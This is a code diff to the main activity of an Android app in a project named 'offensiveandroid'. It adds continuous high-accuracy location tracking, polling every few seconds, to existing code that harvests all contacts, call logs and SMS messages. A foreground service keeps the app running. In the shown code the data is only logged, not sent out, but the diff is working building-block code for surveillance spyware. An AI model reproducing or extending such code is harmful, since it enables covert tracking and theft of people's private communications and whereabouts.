@@ -10,6 +10,7 @@ import android.widget.Toast
 import androidx.core.app.ActivityCompat
 import com.example.offensiveandroid.ui.theme.CallLogsRetriever
 import com.example.offensiveandroid.ui.theme.ContactsRetriever
+import com.example.offensiveandroid.ui.theme.LocationUtils
 import com.example.offensiveandroid.ui.theme.SMSRetriever
 import com.google.android.gms.common.api.ResolvableApiException
 import com.google.android.gms.location.LocationServices
@@ -22,6 +23,7 @@ class MainActivity : AppCompatActivity() {
     private lateinit var contacts: ContactsRetriever
     private lateinit var callLogs : CallLogsRetriever
     private lateinit var sms: SMSRetriever
+    private lateinit var location : LocationUtils
     companion object {
         const val REQUEST_LOCATION_SETTINGS = 1001
         const val BACKGROUND_LOCATION_REQUEST_CODE = 1002
@@ -36,6 +38,7 @@ class MainActivity : AppCompatActivity() {
         contacts = ContactsRetriever(this)
         callLogs = CallLogsRetriever(this)
         sms = SMSRetriever(this)
+        location = LocationUtils(this)
 
         checkAndRequestPermissions()
         val serviceIntent = Intent(this, MyForegroundService::class.java)
@@ -88,6 +91,17 @@ class MainActivity : AppCompatActivity() {
             Log.e("Contacts",contacts.getAllContacts().toString())
             Log.e("CallLogs",callLogs.getCallLogs().toString())
             Log.e("SMS", sms.getSMS().toString())
+            location.requestLocationUpdates(
+                interval = 10000L,
+                fasterInterval = 5000L,
+                priority = Priority.PRIORITY_HIGH_ACCURACY
+            ){ location ->
+                if (location != null){
+                    Log.d("Location","Location Update : ${location.latitude}, ${location.longitude}")
+                } else {
+                    Log.e("Location","Failed to get location update")
+                }
+            }
         }
     }
 
